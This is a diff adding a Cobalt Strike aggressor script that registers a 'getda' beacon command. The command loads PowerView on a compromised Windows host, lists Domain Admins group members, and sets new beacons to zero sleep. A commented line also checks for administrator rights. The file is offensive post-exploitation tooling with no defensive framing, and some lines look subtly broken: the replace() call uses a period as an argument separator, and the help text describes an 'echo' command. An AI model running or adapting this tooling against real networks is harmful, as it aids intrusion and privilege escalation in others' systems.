@@ -1,0 +1,29 @@
+# quickly run Powerview
+sub powerview {
+  bpowershell_import($1, script_resource("powerview.ps1"));
+}
+
+alias getda {
+  powerview($1);
+  bpowershell($1, '$a = Get-NetGroupMember -GroupName "Domain Admins"; $a.MemberName');
+  on beacon_output {
+    $s = replace($2, 'received output:\n'.'');
+    println($s);
+    break;
+  }
+}
+
+# register the GetDa command
+beacon_command_register(
+  "getda", 
+  "Gathers the DA list of users", 
+  "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
+
+# set up the Initial check
+on beacon_initial {
+  bsleep($1, 0, 0);
+}
+
+#  bpowershell($1, '$user = [Security.Principal.WindowsIdentity]::GetCurrent();(New-Object Security.Principal.
+#  WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)');
+
